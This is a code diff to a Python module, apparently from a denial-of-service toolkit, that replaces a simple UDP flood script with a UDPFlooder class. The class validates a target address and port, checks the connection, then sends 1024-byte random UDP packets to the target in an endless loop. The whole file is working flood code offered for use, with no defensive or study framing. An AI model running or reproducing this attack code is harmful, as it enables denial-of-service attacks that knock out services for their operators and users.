@@ -1,26 +1,45 @@
-import time
 import socket
-import random
-import sys
-
-address_to_attack = ''
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-
-def generate_msg():
-    return bytes(random.getrandbits(10))
+from os import urandom as randbytes
+from .main import Attacker
+from .validators import AddressWithPortValidator
+from .connection_checkers import UDPChecker
+from .utils import Address
 
 
-def start_flood():
-    sent_packets = 0
-    ip, port = address_to_attack.split(':')
-    while True:
-        sock.sendto(generate_msg(), (ip, int(port)))
-        sent_packets += 1
-        print(f'{sent_packets} packages sent')
+class UDPFlooder(Attacker):
+    def __init__(self, address):
+        self.address = Address(address)
+        self._requsets_sent = 0
 
+    def validate(self):
+        AddressWithPortValidator(self.address.raw).validate()
 
-def run(address):
-    global address_to_attack
-    address_to_attack = address
-    start_flood()
+    def run(self):
+        self.validate()
+        self.check_connection()
+        self._start_flood()
+
+    def _start_flood(self):
+        address = self.address.get_address()
+        port = int(self.address.get_port())
+        try:
+            with self.get_socket() as sockt:
+                while True:
+                    if self._requsets_sent % 100000:
+                        self.check_connection()
+                    sockt.sendto(randbytes(1024), (address, port))
+                    self._requsets_sent += 1
+                    print(f'Sent {self._requsets_sent} requests')
+        finally:
+            sockt.close()
+
+    def check_connection(self):
+        checker = self.get_checker()
+        checker.check_connection()
+
+    @staticmethod
+    def get_socket():
+        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    def get_checker(self):
+        return UDPChecker(self.address.get_address(), self.address.get_port())
